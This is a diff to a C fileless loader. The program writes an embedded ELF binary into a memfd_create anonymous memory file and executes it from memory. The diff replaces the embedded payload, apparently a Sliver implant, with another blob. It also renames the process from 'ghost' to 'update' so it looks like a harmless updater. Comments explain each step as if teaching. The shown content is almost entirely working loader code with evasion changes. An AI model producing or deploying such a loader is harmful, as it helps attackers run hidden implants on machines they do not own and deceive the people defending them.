@@ -32,7 +32,7 @@ int main(int argc, char *argv[]) {
     // We use MFD_CLOEXEC so this fd is automatically closed
     // after exec, preventing child processes from inheriting
     // (and potentially tampering with) the memory file.
-    int fd = memfd_create("ghost", MFD_CLOEXEC);
+    int fd = memfd_create("update", MFD_CLOEXEC);
     if (fd == -1) {
         perror("memfd_create failed");
         return 1;
@@ -42,8 +42,8 @@ int main(int argc, char *argv[]) {
     // STEP B: Write the ELF binary into the memory file
     // This is like `write()` to any file, except the
     // backing store is anonymous memory, not a disk block.
-    ssize_t written = write(fd, ___sliver_first, ___sliver_first_len);
-    if (written != (ssize_t)___sliver_first_len) {
+    ssize_t written = write(fd, clearNEGATIVE_LYNX, clearNEGATIVE_LYNX_len);
+    if (written != (ssize_t)clearNEGATIVE_LYNX_len) {
         perror("write failed");
         close(fd);
         return 1;
@@ -51,7 +51,7 @@ int main(int argc, char *argv[]) {
     printf("[+] Wrote %zd bytes into anonymous memory fd\n", written);
 
     // STEP C: Execute the in-memory binary
-    char *new_argv[] = { "ghost", NULL };
+    char *new_argv[] = { "update", NULL };
     char *new_envp[] = { NULL };
 
     if (use_procfd) {
@@ -86,6 +86,7 @@ int main(int argc, char *argv[]) {
     close(fd);
     return 1;
 }
+
 
 ```
 
